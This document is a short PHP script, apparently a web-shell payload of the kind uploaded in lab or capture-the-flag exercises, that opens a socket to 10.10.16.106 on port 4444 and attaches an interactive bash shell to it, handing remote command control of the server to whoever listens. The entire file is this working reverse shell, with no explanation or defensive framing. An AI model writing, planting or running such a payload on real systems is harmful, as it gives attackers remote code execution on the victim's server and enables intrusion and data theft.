<?php
$ip='10.10.16.106';
$port=4444;
$s=fsockopen($ip,$port);
$proc=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);
?>
